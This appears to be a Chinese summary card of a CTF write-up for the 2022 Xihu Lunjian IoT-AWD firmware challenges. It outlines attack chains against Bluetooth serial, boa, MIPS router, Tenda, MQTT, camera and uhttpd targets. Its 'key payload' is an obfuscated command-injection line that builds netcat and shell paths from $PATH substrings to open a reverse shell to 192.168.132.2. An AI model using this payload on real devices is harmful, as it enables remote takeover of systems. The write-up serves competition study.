---
title: "2022 西湖论剑 IoT-AWD 赛题官方 WriteUp (上篇：一号固件&二号固件)"
category: pwn
tags: ["2022 西湖论剑 IoT-AWD", "pwn", "IoT-AWD", "蓝牙", "ble-serial", "xhttpd"]
signals: ["2022 西湖论剑 IoT-AWD 2022", "IoT-AWD", "蓝牙", "ble-serial", "xhttpd", "boa", "ubus", "环境变量绕过", "命令注入", "pwn_unknown", "rce", "web_unknown", "sqli", "HZCSSC"]
difficulty: hard
source: "https://www.ctfiot.com/105717.html"
tools: ["ARM"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 西湖论剑 IoT-AWD 赛题官方 WriteUp (上篇：一号固件&二号固件)

> 赛事：2022 西湖论剑 IoT-AWD 2022 | 方向：pwn | 难度：hard | 工具：ARM

## 一句话总结

西湖论剑 IoT-AWD 1-2 号固件：蓝牙 HZCSSC + boa 8080 + MIPS 路由命令注入

## 攻击链

1. Q1 easybluetooth: ble-serial -d 连接 HZCSSC 蓝牙串口, 小写转大写绕过用 ${PATH:10:8} 截取, system 命令注入
2. Q2 xhttpd: boa web 服务 8080 端口, cgi-bin 脚本, 命令注入
3. Q3 A1 mips: MIPS 路由, RCE 通过 cgi-bin
4. Q4 Tenda AC: AC 系列路由, 已知 CVE / 弱口令
5. Q5 mqtt: 订阅 + 发布, 认证绕过
6. Q6 mipsel ipc: IPC 摄像头, mipsel 架构, 默认密码
7. Q7 hatmatrix 哈希长度扩展: SHA1/MD5 长度扩展拿 token
8. Q8 uhttpd: uhttpd 服务 CGI, 已知后门

## 关键 payload

```
;${PATH:10:8}/${PATH:8:1}? 192.168.132.2 2333 |${PATH:14:4}${PATH:4:2}?| ${PATH:10:8}/${PATH:8:1}? 192.168.132.2 4000;
```

## 经验教训

IoT AWD 模式 = 真机攻击; ble-serial 是蓝牙调试工具; ${PATH:offset:length} 绕过大小写转换是经典

## 标签

IoT-AWD、蓝牙、ble-serial、xhttpd、boa、ubus、环境变量绕过、命令注入、mips、mipsel、ARM、A1、Tenda、AC、ipc、mqtt、AT、RCE、hatmatrix、hash-length-extension、uhttpd

## 参考来源

- https://www.ctfiot.com/105717.html
- 原文件：2022西湖论剑_IoT-AWD_赛题官方_WriteUp_（上篇）：一号固件&二号固件.full.md
